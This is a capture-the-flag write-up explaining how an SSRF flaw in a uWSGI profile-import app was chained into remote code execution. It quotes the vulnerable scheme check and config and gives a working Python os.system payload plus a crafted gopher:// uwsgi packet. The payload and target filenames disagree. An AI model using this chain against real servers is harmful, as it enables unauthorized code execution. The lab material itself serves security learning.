---
layout: ctf-layout
title: IOI SaveData
permalink: /writeups/web/ioi-savedata
comments: false
---
<p align="center">
  <img src="https://i.imgflip.com/977lta.jpg" title="IOI SaveData" width="100%" />
</p>

##### Difficulty: <b>Hard</b> 

##### Description:
To help Art3mis escape from the IOI loyalty center, Parzival and Aech need to hack into Sorrento's computer. They have discovered that IOI developed an exploit that lets them arbitrarily change the OASIS profile data of individual players. Sorrento has left the web interface for that profile editor exposed in his home network. Can you take a look and see if you can get inside?

##### Challenge: 
This was the hardest web challenge of the CTF. It involved a uWSGI application that allowed us to update the profiles of different players. I personally went down several rabbit holes during this challenge, attempting to exploit path traversal or achieve RCE by updating the profile name. I even tried updating a profile to a uWSGI config file with an exec directive, hoping it would execute a reverse shell when another profile was updated. However, the actual solution was an SSRF vulnerability that allowed interaction with the uWSGI port, ultimately leading to RCE. The full exploit chain can be found [here](https://github.com.mcas-gov.us/rwincey/hacks/blob/main/uwsgi_rce.py)

##### Vulnerable Code:
The scheme validation is flawed because it uses a filter function improperly, allowing invalid schemes like ftp or file to bypass the check. Additionally, an attacker could exploit this by sending requests to internal services or sensitive endpoints (like localhost or other internal networks) since the domain check only restricts the domain to a specific value, leaving other internal domains unprotected.
###### /app/util.py file:
```python
 def get_profile(url):
    domain = urlparse(url).hostname
    scheme = urlparse(url).scheme

    if not filter(lambda x: scheme in x, ('http',' https')):
        return f'Scheme {scheme} is not allowed'

    elif domain and not domain == 'ioi-corp.local':
        return f'Domain {domain} is not allowed'

    try:
        jsonData = json.loads(request(url))
        return jsonData
    except:
        return 'Not a valid save data file'
```
<br>

The port that uwsgi is listening on is port 5000, as seen below in the configuration file: 

```ini
[uwsgi]
module = wsgi:app

uid = www-data
gid = www-data

socket = 127.0.0.1:5000
socket = /tmp/uwsgi.sock

chown-socket = www-data:www-data
chmod-socket = 664

master = True
processes = 4
threads = 2

buffer-size=1000000
vacuum = True
die-on-term = True

need-app = true

pythonpath = %(chdir)
pythonpath = /app/venv/lib/python3.8/site-packages
```

##### Solution 
Im gonna keep it brief because I spent a bunch of time on this challenge, and have a bunch of unnecessary notes. 

##### Part 1: Create the python payload and insert it into one of the profiles:

```python
import os
os.system("/readflag > /app/profiles/IOI-655323.json")
```

##### Part 2: Execute SSRF payload via the import profile route 
```URL
gopher:///127.0.0.1:5000/_%00%D2%00%00%0F%00SERVER_PROTOCOL%08%00HTTP/1.1%0E%00REQUEST_METHOD%03%00GET%09%00PATH_INFO%01%00/%0B%00REQUEST_URI%01%00/%0C%00QUERY_STRING%00%00%0B%00SERVER_NAME%00%00%09%00HTTP_HOST%0E%00127.0.0.1%3A5000%0A%00UWSGI_FILE%1D%00/app/profiles/IOI-655321.json%0B%00SCRIPT_NAME%10%00/IOI-655321.json
```

##### Payload Breakdown:
If the SSRF vulnerability is successfully exploited using the Gopher protocol to interact with uWSGI on its internal port (5000). If uWSGI is misconfigured to treat that targeted JSON file—IOI-655321.json—as executable Python code. In that case, we’re looking at a potential remote code execution (RCE) scenario. Basically, the Python code inside the JSON file could be executed by the server, giving an attacker the power to run arbitrary commands and take control of the system.
<br>
After hitting import, it will say "Not a valid save data file", but if we load the profile that we sent the flag.. we see it actually worked!

##### The Flag: 

<p align="center">
  <img src="https://i.imgflip.com/977qkt.jpg" title="The Flag!!!" width="100%" />
</p>








